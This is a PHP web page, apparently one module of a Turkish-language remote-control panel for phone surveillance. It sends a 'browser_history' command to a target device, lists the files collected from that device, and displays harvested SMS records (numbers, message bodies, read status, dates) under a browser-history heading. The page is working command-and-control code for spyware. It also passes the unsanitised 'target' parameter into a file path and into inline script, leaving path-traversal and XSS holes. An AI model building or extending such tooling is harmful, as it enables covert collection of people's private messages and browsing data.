<?php 
require_once 'module_controller.php';
$uid_device = $_GET['target'];
$contact_path = '../private/storage/browser-history-'.$uid_device.'*';
$filelist = glob($contact_path);
$contact_file_list = array();
foreach ($filelist as $file){
    $c_data = explode("/", $file);
    $num = (count($c_data) - 1);
    array_push($contact_file_list, $c_data[$num]);
}

?>

    <div class="row">
        <div class="col-md-11 col-lg-offset-0">
            <div class="well">

                <img id="command-sender-id" name="command-sender-id" src="./images/signal-sender.png" style='height:48px;'/>

                <div class="col-md-10 col-lg-offset-0">
                        <label for="select" class="col-lg-2 control-label">Kayıtlı Dosyalar</label>
                        <div class="col-lg-4">
                            <select class="form-control" id="selected-file" name="selected-file">
                                <?php
                                foreach ($contact_file_list as $file_name){
                                    echo '<option>'.$file_name.'</option>';
                                }
                                ?>
                            </select>
                        </div>

                        <button type="button" id="btn-show-file" name="btn-show-file" class="btn btn-default">Dosyayı Göster</button>

                </div>

                <div class="row"></div>
                <br><br>
                <legend>Tarayıcı Geçmişi</legend>
                <div class="row">
                    <table class="table table-striped table-hover ">
                            <thead>
                            <tr>
                                <th>#</th>
                                <th>Türü</th>
                                <th>Tel. No.</th>
                                <th>SMS</th>
                                <th>Okundu</th>
                                <th>Gönderilen Tarih</th>
                            </tr>
                            </thead>
                            <tbody id="body-content-id">

                            </tbody>
                        </table>
                </div>
                <br><br>
            </div>
        </div>
    </div>

<script>

    $("#btn-show-file").click(function() {

        $('#body-content-id').empty();
        $('#body-content-id').html('');

        var selected_file = $( "#selected-file option:selected" ).text();

        $.post( "commands.php", { browser_file_name: selected_file}, function( data, err ) {
            console.log(data);
            console.log(err);
            if (data){
                Toastify({
                    text: "Komut gönderildi.!",
                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                    className: "info",
                }).showToast();
                var index_contact = 0;
                $.each(data['sms_list'], function(i, item) {
                    index_contact +=1;
                    var sms_date = new Date(data['sms_list'][i].receivedDate).toGMTString();
                    $('<tr>').html(
                        "<td>" + index_contact + "</td><td>"
                        + data['sms_list'][i].type  + "</td><td>"
                        + data['sms_list'][i].address  + "</td><td>"
                        + data['sms_list'][i].body  + "</td><td>"
                        + data['sms_list'][i].read  + "</td><td>"

                        + sms_date + "</td>").appendTo('#body-content-id');
                });

            } else {
                Toastify({
                    text: "Komut başarısız.!",
                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                    className: "info",
                }).showToast();
            }

        }, "json");

    });

    $("#command-sender-id").click(function() {
        $.post( "commands.php", { send_command: true, target:"<?php echo $uid_device;?>", type: "browser_history", value: true}, function( data, err ) {
            if (data.status){
                Toastify({
                    text: "Komut gönderildi.!",
                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                    className: "info",
                }).showToast();
            } else {
                Toastify({
                    text: "Komut başarısız.!",
                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                    className: "info",
                }).showToast();
            }

        }, "json");

    });

</script>
